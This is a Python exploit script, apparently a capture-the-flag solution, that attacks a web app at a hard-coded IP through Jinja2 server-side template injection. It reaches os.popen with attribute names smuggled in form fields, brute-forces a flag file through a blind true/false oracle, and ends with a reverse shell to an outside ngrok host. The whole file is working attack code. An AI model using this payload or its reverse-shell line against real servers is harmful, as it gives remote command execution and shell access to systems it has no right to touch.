import string
import requests
import signal
import sys
import os
from Helpers import *
from Brute import *


TARGET_URL="http://34.118.62.248"

def signal_handler(sig, frame):
    print('\nExiting...')
    sys.exit(0)

success=requests.post(TARGET_URL,data={"name":"{% if True %}1{% endif %}"}).text
fail=requests.post(TARGET_URL,data={"name":"{% if False %}1{% endif %}"}).text

def rce(cmd):
    #exploit="{% if self['_TemplateReference__context']['cycler']['__init__']['__globals__']['os']['popen']('"+cmd+"')['read']() %}yay{% endif %}"
    exploit="{% if self[request['form']['t']]['cycler'][request['form']['i']][request['form']['g']]['os']['popen']('"+cmd+"')['read']() %}1{% endif %}"
    #print(exploit)
    data={
        "name":exploit,
        "t" : "_TemplateReference__context",
        "i" : "__init__",
        "g" : "__globals__"
    }
    res=requests.post(TARGET_URL,data=data)
    print(res.text)
    if res.text==success:
        return True
    elif res.text==fail:
        return False
    else:
        print(res.text)

def req(cmd,ch,i):
    i=i+1
    #exploit="{% if self['_TemplateReference__context']['cycler']['__init__']['__globals__']['os']['popen']('"+cmd+"')['read']() %}yay{% endif %}"
    exploit="{% if self[request['form']['t']]['cycler'][request['form']['i']][request['form']['g']]['os']['popen']('"+cmd+"| cut -c"+str(i)+"')['read']() == '"+ch+"\n' %}1{% endif %}"
    #print(exploit)
    data={
        "name":exploit,
        "t" : "_TemplateReference__context",
        "i" : "__init__",
        "g" : "__globals__"
    }
    res=requests.post(TARGET_URL,data=data)
    #print(res.text)
    if res.text==success:
        return True
    elif res.text==fail:
        return False
    else:
        print(res.text)

def menu():
    #print(success)
    #print(fail)
    options=Helpers.getOptions()
    options['checkChar']=lambda i,ch: req("cat flag*|tr \"\\n\" \" \"",ch,i)
    options['len']=41
    options['charset']=string.ascii_letters+string.digits+"}{_*#$"
    options['flag']="GrabCON{247fbb554669f9d9b0bb55c7d35"
    brute = Brute(**options)
    #req("echo -n 1",'1',1)
    flag=brute.run(5)
    print(flag)

rce('/bin/sh -c "/bin/sh -i >& /dev/tcp/2.tcp.ngrok.io/19954 0>&1"')